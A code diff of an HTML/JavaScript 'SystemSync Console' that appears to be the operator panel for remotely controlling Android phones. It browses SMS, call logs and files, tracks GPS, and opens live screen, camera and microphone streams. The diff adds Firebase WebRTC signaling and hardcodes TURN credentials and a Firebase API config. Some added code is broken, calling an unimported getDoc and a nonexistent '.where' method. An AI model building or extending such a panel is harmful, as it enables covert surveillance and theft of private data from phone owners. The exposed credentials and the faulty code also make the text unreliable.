@@ -1,9 +1,11 @@
+
 <!DOCTYPE html>
 <html>
 <head>
     <title>SystemSync Console</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
+        /* (keep your existing CSS – unchanged) */
         /* ===== GLOBAL ===== */
         body{
             margin:0;
@@ -13,8 +15,6 @@
             height:100vh;
             overflow:hidden;
         }
-
-        /* ===== SIDEBAR ===== */
         #sidebar{
             width:280px;
             background:white;
@@ -23,18 +23,15 @@
             overflow-y:auto;
             box-shadow:2px 0 5px rgba(0,0,0,0.02);
         }
-
         .logo{
             font-size:20px;
             font-weight:600;
             color:#1976ff;
             margin-bottom:30px;
         }
-
         .section{
             margin-bottom:25px;
         }
-
         .section-title{
             font-size:12px;
             font-weight:600;
@@ -43,7 +40,6 @@
             letter-spacing:0.5px;
             margin-bottom:12px;
         }
-
         button{
             width:100%;
             padding:10px 12px;
@@ -60,13 +56,11 @@
             align-items:center;
             gap:8px;
         }
-
         button:hover{
             background:#1976ff;
             color:white;
             border-color:#1976ff;
         }
-
         /* camera control panels */
         .camera-panel {
             background: #f0f2f5;
@@ -98,7 +92,6 @@
         .capture-btn:hover, .live-btn:hover {
             background: #0d5bca;
         }
-
         /* live stream controls */
         .live-controls {
             display: flex;
@@ -126,8 +119,6 @@
             opacity: 0.5;
             cursor: not-allowed;
         }
-
-        /* ===== MAIN PANEL ===== */
         #main{
             flex:1;
             display:flex;
@@ -135,7 +126,6 @@
             min-width:0;
             background:#f5f7fa;
         }
-
         #header{
             height:60px;
             background:white;
@@ -147,7 +137,6 @@
             font-weight:600;
             color:#1a2634;
         }
-
         #status{
             padding:6px 16px;
             border-radius:30px;
@@ -155,14 +144,11 @@
             color:#1976ff;
             font-weight:500;
         }
-
         #content{
             flex:1;
             padding:20px;
             overflow:auto;
         }
-
-        /* SINGLE CONTENT PANEL */
         #main-panel{
             background:white;
             border-radius:12px;
@@ -171,13 +157,10 @@
             min-height:100%;
             position:relative;
         }
-
-        /* ===== MAP ===== */
         #map{
             height:400px;
             border-radius:10px;
         }
-        /* GPS overlay */
         .map-info {
             position: absolute;
             top: 30px;
@@ -202,8 +185,6 @@
             color: #2c3e50;
             font-style: italic;
         }
-
-        /* ===== TABLES ===== */
         table{
             width:100%;
             border-collapse:collapse;
@@ -226,8 +207,6 @@
         tr:hover{
             background:#f5f9ff;
         }
-
-        /* ===== FILE EXPLORER ===== */
         .file-manager {
             display: flex;
             flex-direction: column;
@@ -362,8 +341,6 @@
         .download-selected button:hover{
             background:#0d5bca;
         }
-
-        /* ===== PAGINATION ===== */
         .pagination{
             margin-top:20px;
             display:flex;
@@ -383,8 +360,6 @@
             color:white;
             border-color:#1976ff;
         }
-
-        /* ===== IMAGES & VIDEO ===== */
         img, video{
             max-width:100%;
             max-height:70vh;
@@ -392,8 +367,6 @@
             display:block;
             margin:0 auto;
         }
-
-        /* ===== AUDIO PLAYER ===== */
         audio{
             width:100%;
             margin-top:15px;
@@ -469,46 +442,47 @@
     </div>
 </div>
 
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<script>
-    // ---------- CONFIG ----------
-    const WS_URL = "wss://mirror-view.onrender.com";
-
-    // ---------- ICE SERVERS (from provided credentials) ----------
-    const ICE_SERVERS = [
-        { urls: "stun:stun.relay.metered.ca:80" },
-        {
-            urls: "turn:standard.relay.metered.ca:80",
-            username: "dc05b4f4ae8aaae1fff19747",
-            credential: "OrIiLL1BH86B17iP"
-        },
-        {
-            urls: "turn:standard.relay.metered.ca:80?transport=tcp",
-            username: "dc05b4f4ae8aaae1fff19747",
-            credential: "OrIiLL1BH86B17iP"
-        },
-        {
-            urls: "turn:standard.relay.metered.ca:443",
-            username: "dc05b4f4ae8aaae1fff19747",
-            credential: "OrIiLL1BH86B17iP"
-        },
-        {
-            urls: "turns:standard.relay.metered.ca:443?transport=tcp",
-            username: "dc05b4f4ae8aaae1fff19747",
-            credential: "OrIiLL1BH86B17iP"
+<!-- Firebase SDK (modular) -->
+<script type="importmap">
+    {
+        "imports": {
+            "firebase/app": "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js",
+            "firebase/firestore": "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js"
         }
-    ];
+    }
+</script>
 
-    // ---------- GLOBALS ----------
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script type="module">
+    // ---------- FIREBASE INIT ----------
+    import { initializeApp } from "firebase/app";
+    import { getFirestore, doc, setDoc, updateDoc, collection, addDoc, onSnapshot, deleteDoc } from "firebase/firestore";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyCHjKvbe3ZIlCE6aN5euzEF2d-bt-u9ROc",
+        authDomain: "webviewiot.firebaseapp.com",
+        projectId: "webviewiot",
+        storageBucket: "webviewiot.firebasestorage.app",
+        messagingSenderId: "634777347775",
+        appId: "1:634777347775:web:f8efc5bcdf19e3f1de880a",
+        measurementId: "G-2KW4EJYTRB"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    console.log("Firebase initialized");
+
+    // ---------- YOUR EXISTING WS AND GLOBALS ----------
+    const WS_URL = "wss://mirror-view.onrender.com";
     let ws;
     let pc = null;                     // WebRTC peer for screen share
     let mapInstance = null;
-    let currentData = [];               // for pagination
+    let currentData = [];
     let currentPage = 0;
-    let dataType = null;                // 'sms', 'call', 'file'
-    let currentPath = "root";           // current directory for file manager
-    let selectedFiles = [];              // paths of selected files for download
-    let downloadQueue = [];              // queue of paths for which we've sent 'dl' and await FILE_DATA
+    let dataType = null;
+    let currentPath = "root";
+    let selectedFiles = [];
+    let downloadQueue = [];
 
     // Live camera state
     let liveCamPC = null;
@@ -528,33 +502,293 @@
 
     const panel = document.getElementById('main-panel');
 
-    // ---------- CONNECTION (with dual message handling) ----------
-    function connect() {
-        ws = new WebSocket(WS_URL);
-        ws.onopen = () => {
-            console.log('Connected');
-            ws.send("I_AM_WEB");
-            setStatus("ONLINE");
-        };
-        ws.onmessage = (e) => {
-            const msg = e.data;
-            console.log('Received:', msg);
+    // ---------- ICE SERVERS (Metered.ca) ----------
+    const ICE_SERVERS = [
+        { urls: "stun:stun.relay.metered.ca:80" },
+        { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
+        { urls: "turn:standard.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
+        { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
+        { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
+    ];
 
-            // Try to parse as JSON first
-            try {
-                const json = JSON.parse(msg);
-                handleJSON(json);
-                return;
-            } catch (err) {
-                // Not JSON – fallback to plain text
-                handlePlainText(msg);
+    // ---------- FIREBASE SIGNALING HELPERS ----------
+    let currentRoomId = null;
+    let roomUnsubscribe = null;
+    let candidatesUnsubscribe = null;
+
+    async function createWebRTCRoom(offerSdp, streamType) {
+        const roomId = 'room_' + Date.now() + '_' + Math.random().toString(36).substring(7);
+        currentRoomId = roomId;
+        const roomData = {
+            caller: 'web-client',
+            callee: 'android-device',
+            status: 'waiting',
+            type: streamType, // "screen", "camera", "audio"
+            createdAt: new Date(),
+            offer: {
+                type: 'offer',
+                sdp: offerSdp
             }
         };
-        ws.onclose = () => {
-            setStatus('OFFLINE');
-            setTimeout(connect, 5000);
+        await setDoc(doc(db, "rooms", roomId), roomData);
+        console.log('Room created:', roomId);
+        listenForRoomAnswer(roomId);
+        return roomId;
+    }
+
+    function listenForRoomAnswer(roomId) {
+        if (roomUnsubscribe) roomUnsubscribe();
+        roomUnsubscribe = onSnapshot(doc(db, "rooms", roomId), (docSnap) => {
+            if (!docSnap.exists()) return;
+            const data = docSnap.data();
+            if (data.answer && data.answer.sdp && pc) {
+                console.log('Answer received');
+                const answer = new RTCSessionDescription({
+                    type: 'answer',
+                    sdp: data.answer.sdp
+                });
+                pc.setRemoteDescription(answer).catch(e => console.error('Error setting remote desc:', e));
+            }
+            if (data.status === 'ended') {
+                console.log('Call ended by peer');
+                if (pc) { pc.close(); pc = null; }
+                if (liveCamPC) { liveCamPC.close(); liveCamPC = null; }
+                if (liveAudioPC) { liveAudioPC.close(); liveAudioPC = null; }
+                if (roomUnsubscribe) roomUnsubscribe();
+                if (candidatesUnsubscribe) candidatesUnsubscribe();
+                panel.innerHTML = 'Stream ended.';
+            }
+        });
+    }
+
+    function listenForRemoteCandidates(roomId, remoteUser) {
+        if (candidatesUnsubscribe) candidatesUnsubscribe();
+        const candidatesRef = collection(db, "rooms", roomId, "candidates");
+        candidatesUnsubscribe = onSnapshot(candidatesRef.where("sender", "==", remoteUser), (snapshot) => {
+            snapshot.docChanges().forEach((change) => {
+                if (change.type === 'added') {
+                    const data = change.doc.data();
+                    const candidate = new RTCIceCandidate({
+                        candidate: data.candidate,
+                        sdpMid: data.sdpMid,
+                        sdpMLineIndex: data.sdpMLineIndex
+                    });
+                    if (pc) pc.addIceCandidate(candidate);
+                    else if (liveCamPC) liveCamPC.addIceCandidate(candidate);
+                    else if (liveAudioPC) liveAudioPC.addIceCandidate(candidate);
+                }
+            });
+        });
+    }
+
+    async function sendIceCandidateViaFirebase(roomId, candidate) {
+        const candidateData = {
+            candidate: candidate.candidate,
+            sdpMid: candidate.sdpMid,
+            sdpMLineIndex: candidate.sdpMLineIndex,
+            sender: 'web-client',
+            timestamp: new Date()
         };
-        ws.onerror = console.error;
+        await addDoc(collection(db, "rooms", roomId, "candidates"), candidateData);
+    }
+
+    // ---------- JOIN ROOM (when Android creates room) ----------
+    async function joinFirebaseRoom(roomId) {
+        const roomRef = doc(db, "rooms", roomId);
+        const roomSnap = await getDoc(roomRef);
+        if (!roomSnap.exists()) {
+            console.error('Room not found');
+            return;
+        }
+        const data = roomSnap.data();
+        const streamType = data.type; // "screen", "camera", "audio"
+        const offerSdp = data.offer.sdp;
+
+        // Create appropriate peer connection based on type
+        if (streamType === 'screen') {
+            if (!pc) createScreenPeerConnection();
+        } else if (streamType === 'camera') {
+            if (!liveCamPC) createLiveCamPeerConnection();
+        } else if (streamType === 'audio') {
+            if (!liveAudioPC) createLiveAudioPeerConnection();
+        }
+
+        // Set remote offer and create answer
+        const pcToUse = streamType === 'screen' ? pc : (streamType === 'camera' ? liveCamPC : liveAudioPC);
+        if (!pcToUse) return;
+
+        const offer = new RTCSessionDescription({ type: 'offer', sdp: offerSdp });
+        await pcToUse.setRemoteDescription(offer);
+        const answer = await pcToUse.createAnswer();
+        await pcToUse.setLocalDescription(answer);
+
+        // Send answer to Firebase
+        await updateDoc(roomRef, {
+            answer: {
+                type: 'answer',
+                sdp: answer.sdp,
+                sender: 'web-client'
+            }
+        });
+
+        // Listen for remote ICE candidates
+        listenForRemoteCandidates(roomId, 'android-device');
+        currentRoomId = roomId;
+    }
+
+    // ---------- WEBRTC CONNECTION CREATORS ----------
+    function createScreenPeerConnection() {
+        pc = new RTCPeerConnection({ iceServers: ICE_SERVERS });
+        pc.ontrack = (e) => {
+            panel.innerHTML = '<video autoplay playsinline style="width:100%; height:100%;"></video>';
+            document.querySelector('video').srcObject = e.streams[0];
+        };
+        pc.onicecandidate = (e) => {
+            if (e.candidate && currentRoomId) {
+                sendIceCandidateViaFirebase(currentRoomId, e.candidate);
+            }
+        };
+        pc.oniceconnectionstatechange = () => {
+            console.log('Screen PC ICE state:', pc.iceConnectionState);
+        };
+        return pc;
+    }
+
+    function createLiveCamPeerConnection() {
+        liveCamPC = new RTCPeerConnection({ iceServers: ICE_SERVERS });
+        liveCamPC.ontrack = (e) => {
+            liveCamStream = e.streams[0];
+            document.getElementById('liveCamVideo').srcObject = liveCamStream;
+        };
+        liveCamPC.onicecandidate = (e) => {
+            if (e.candidate && currentRoomId) {
+                sendIceCandidateViaFirebase(currentRoomId, e.candidate);
+            }
+        };
+        return liveCamPC;
+    }
+
+    function createLiveAudioPeerConnection() {
+        liveAudioPC = new RTCPeerConnection({ iceServers: ICE_SERVERS });
+        liveAudioPC.ontrack = (e) => {
+            liveAudioStream = e.streams[0];
+            const audioEl = document.getElementById('liveAudio');
+            if (audioEl) audioEl.srcObject = liveAudioStream;
+        };
+        liveAudioPC.onicecandidate = (e) => {
+            if (e.candidate && currentRoomId) {
+                sendIceCandidateViaFirebase(currentRoomId, e.candidate);
+            }
+        };
+        return liveAudioPC;
+    }
+
+    // ---------- MODIFIED TOGGLE FUNCTIONS ----------
+    async function toggleScreen() {
+        if (screenActive) {
+            // Stop screen share
+            if (pc) pc.close();
+            pc = null;
+            if (currentRoomId) {
+                await updateDoc(doc(db, "rooms", currentRoomId), { status: "ended" });
+                currentRoomId = null;
+            }
+            document.getElementById('screenBtn').innerText = 'Start Screen';
+            screenActive = false;
+        } else {
+            // Start screen share
+            if (!ws || ws.readyState !== WebSocket.OPEN) {
+                alert('Not connected to WebSocket (commands only)');
+                // But we can still start WebRTC via Firebase
+            }
+            panel.innerHTML = '<h2>Starting screen share...</h2>';
+            pc = createScreenPeerConnection();
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            const roomId = await createWebRTCRoom(offer.sdp, 'screen');
+            currentRoomId = roomId;
+            // Notify Android via WebSocket to join the room
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({
+                    type: 'COMMAND',
+                    command: 'JOIN_ROOM',
+                    requestId: generateRequestId(),
+                    params: { roomId: roomId }
+                }));
+            }
+            document.getElementById('screenBtn').innerText = 'Stop Screen';
+            screenActive = true;
+        }
+    }
+
+    // For live camera and audio, you'll need similar modifications.
+    // I'll show one example; you can adapt the others.
+
+    async function startLiveStream() {
+        const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
+        const useFlash = document.getElementById('liveFlashCheckbox').checked;
+        const useMic = document.getElementById('liveMicCheckbox').checked;
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+            alert('Not connected to WebSocket (commands only)');
+        }
+
+        panel.innerHTML = `
+            <video id="liveCamVideo" autoplay playsinline></video>
+            <div class="live-controls">
+                <button onclick="takeSnapshot()" id="snapshotBtn">Take Snapshot</button>
+                <button onclick="toggleRecording()" id="recordBtn">Record Video</button>
+                <button class="stop" onclick="stopLiveStream()">Stop</button>
+            </div>
+        `;
+
+        liveCamPC = createLiveCamPeerConnection();
+        const offer = await liveCamPC.createOffer();
+        await liveCamPC.setLocalDescription(offer);
+        const roomId = await createWebRTCRoom(offer.sdp, 'camera');
+        currentRoomId = roomId;
+        // Send command to Android via WebSocket
+        sendCommand('START_CAMERA_STREAM', { camera: camera, flash: useFlash, mic: useMic, roomId: roomId });
+    }
+
+    async function startLiveAudio() {
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+            alert('Not connected to WebSocket (commands only)');
+        }
+        panel.innerHTML = '<div style="text-align:center;">Live audio streaming...<br><audio id="liveAudio" autoplay controls style="width:100%; margin-top:10px;"></audio></div>';
+        liveAudioPC = createLiveAudioPeerConnection();
+        const offer = await liveAudioPC.createOffer();
+        await liveAudioPC.setLocalDescription(offer);
+        const roomId = await createWebRTCRoom(offer.sdp, 'audio');
+        currentRoomId = roomId;
+        sendCommand('START_LIVE_AUDIO', { mic: true, roomId: roomId });
+        document.getElementById('liveAudioBtn').parentElement.style.display = 'none';
+        document.getElementById('stopLiveAudioBtn').style.display = 'block';
+    }
+
+    function stopLiveStream() {
+        if (liveCamPC) {
+            liveCamPC.close();
+            liveCamPC = null;
+        }
+        if (currentRoomId) {
+            updateDoc(doc(db, "rooms", currentRoomId), { status: "ended" });
+            currentRoomId = null;
+        }
+        panel.innerHTML = 'Ready.';
+    }
+
+    function stopLiveAudio() {
+        if (liveAudioPC) {
+            liveAudioPC.close();
+            liveAudioPC = null;
+        }
+        if (currentRoomId) {
+            updateDoc(doc(db, "rooms", currentRoomId), { status: "ended" });
+            currentRoomId = null;
+        }
+        document.getElementById('liveAudioBtn').parentElement.style.display = 'block';
+        document.getElementById('stopLiveAudioBtn').style.display = 'none';
+        panel.innerHTML = 'Ready.';
     }
 
     // ---------- JSON HANDLER ----------
@@ -1278,4 +1512,5 @@
 </script>
 </body>
 </html>
+
 
